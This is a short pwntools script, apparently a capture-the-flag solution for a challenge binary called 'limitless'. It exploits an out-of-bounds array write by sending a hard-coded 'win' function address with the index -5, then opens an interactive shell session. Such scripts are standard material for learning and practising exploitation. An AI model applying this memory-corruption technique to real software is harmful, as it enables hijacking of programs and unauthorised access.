from pwn import *

win_add_int = 134514118			#0x080485c6 
a = process('./limitless')

a.recvuntil('Input the integer value you want to put in the array\n')
a.sendline(str(win_add_int))
a.recvuntil('Input the index in which you want to put the value\n')
a.sendline('-5')
a.interactive()